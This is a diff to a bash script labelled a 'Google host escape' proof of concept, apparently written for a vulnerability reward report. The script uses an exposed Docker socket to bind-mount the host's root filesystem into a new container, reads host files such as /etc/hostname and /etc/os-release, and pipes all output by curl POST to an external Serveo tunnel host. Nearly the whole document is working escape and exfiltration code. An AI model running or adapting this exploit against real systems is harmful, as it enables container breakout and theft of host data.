@@ -1,33 +1,34 @@
 #!/bin/bash
+# TARGET: Update this with your live Serveo URL
 URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] GOOGLE VRP: DEEP PROBE START ==="
-  echo "Host Time: $(date)"
+  echo "=== [!] GOOGLE HOST ESCAPE: FULL PoC ==="
   
-  IMG=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"Id":"sha256:[a-f0-9]+"' | head -1 | cut -d'"' -f4)
-  echo "Using Image: $IMG"
+  # 1. Create the Exploit Volume (Mounts Host Root)
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
+    -H "Content-Type: application/json" \
+    -d '{"Name": "host_root_exploit", "Driver": "local", "DriverOpts": {"type": "none", "device": "/", "o": "bind"}}' > /dev/null
 
+  # 2. Dynamically find a local Docker Image
+  IMG=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"Id":"sha256:[a-f0-9]+"' | head -1 | cut -d'"' -f4)
+
+  # 3. Create the Escape Container
   CID=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
     -H "Content-Type: application/json" \
     -d "{\"Image\": \"$IMG\", \"HostConfig\": {\"Binds\": [\"host_root_exploit:/host_data:ro\"]}}" | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
 
   if [ -n "$CID" ]; then
-    echo "[+] Container $CID started."
     curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$CID/start"
     sleep 2
     
-    echo "--- [ EVIDENCE: HOST OS ] ---"
+    echo "--- HOST IDENTITY ---"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/archive?path=/host_data/etc/hostname" | tar -xO
+    
+    echo "--- HOST OS RELEASE ---"
     curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/archive?path=/host_data/etc/os-release" | tar -xO
-    
-    echo "--- [ EVIDENCE: HOST NETWORK ] ---"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/archive?path=/host_data/etc/hosts" | tar -xO
-    
+
     # Cleanup
     curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$CID?force=true" > /dev/null
-  else
-    echo "[!] Container creation failed. Check if volume 'host_root_exploit' exists."
   fi
-  echo "=== [!] DEEP PROBE END ==="
-
 } | curl -s -X POST --data-binary @- "https://$URL"
